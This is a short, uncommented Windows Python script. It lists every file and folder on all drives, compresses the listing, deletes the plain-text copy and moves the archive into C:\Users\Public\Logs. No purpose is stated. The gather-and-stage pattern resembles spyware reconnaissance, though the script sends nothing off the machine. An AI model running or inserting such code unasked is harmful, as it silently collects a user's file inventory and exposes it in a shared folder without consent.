import os
import win32api
import gzip
import pathlib

user = os.getlogin()

def tree_printer(root):
    with open('C:\\Users\\' + str(user) + '\\AppData\\Local\\Directory_tree.txt', 'a+', encoding="utf-8") as dr:
        for root, dirs, files in os.walk(root):
            for d in dirs:
                dr.write(os.path.join(root, d))
                dr.write('\n')
            for f in files:
                dr.write(os.path.join(root, f))
                dr.write('\n')

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
for drive in drives:
    tree_printer(drive[0:2] + '/')

f_in = open('C:\\Users\\' + str(user) + '\\AppData\\Local\\Directory_tree.txt', 'rb')
f_out = gzip.open('C:\\Users\\' + str(user) + '\\AppData\\Local\\Directory_tree.gz', 'wb')
f_out.writelines(f_in)
f_out.close()
f_in.close()
dir = 'C:\\Users\\' + str(user) + '\\AppData\\Local\\Directory_tree.gz'
os.system('del ' + 'C:\\Users\\' + str(user) + '\\AppData\\Local\\Directory_tree.txt')
pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
os.system('move "' + dir + '" "C:\\Users\\Public\\Logs"')